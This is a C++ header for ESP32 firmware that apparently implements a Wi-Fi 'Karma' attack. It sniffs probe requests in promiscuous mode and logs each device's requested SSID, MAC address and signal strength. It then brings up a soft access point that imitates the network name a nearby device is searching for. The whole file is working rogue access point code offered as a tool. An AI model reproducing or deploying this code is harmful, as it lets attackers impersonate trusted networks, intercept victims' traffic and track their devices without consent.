#ifndef KARMA_HUNTER_H
#define KARMA_HUNTER_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

// Cyber-Gold Aesthetic Module: WiFi Karma 2.0
// Proactive Probe Recognition & Injection

struct Karma_Target {
  String ssid;
  uint8_t bssid[6];
  int rssi;
};

static std::vector<Karma_Target> detected_probes;

void karma_hunter_sniff_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* frame = pkt->payload;
    
    // Probe Request (0x40)
    if (frame[0] == 0x40) {
        int ssid_len = frame[25];
        if (ssid_len > 0 && ssid_len < 32) {
            String found_ssid = "";
            for (int i = 0; i < ssid_len; i++) found_ssid += (char)frame[26 + i];
            
            // Check if already in list
            bool exists = false;
            for(auto& target : detected_probes) {
                if(target.ssid == found_ssid) {
                    exists = true;
                    target.rssi = pkt->rx_ctrl.rssi;
                    break;
                }
            }
            if(!exists) {
                Karma_Target t = {found_ssid, {0,0,0,0,0,0}, pkt->rx_ctrl.rssi};
                memcpy(t.bssid, frame + 10, 6); // Source MAC
                detected_probes.push_back(t);
            }
        }
    }
}

void karma_hunter_start() {
    detected_probes.clear();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&karma_hunter_sniff_cb);
}

void karma_hunter_stop() {
    esp_wifi_set_promiscuous(false);
}

// Advanced Injection (Karma Respond)
void karma_respond_to_all() {
    if (detected_probes.empty()) return;
    
    // Safety: Only respond to the most recently detected probe
    // to prevent WiFi stack crashes from rapid-fire restarts.
    Karma_Target& t = detected_probes.back();
    
    static String current_mimic = "";
    if (t.ssid != current_mimic) {
        Serial.printf("Karma: Targeting %s\n", t.ssid.c_str());
        WiFi.softAP(t.ssid.c_str(), "nova_secure", 1, 0); 
        current_mimic = t.ssid;
    }
}

#endif
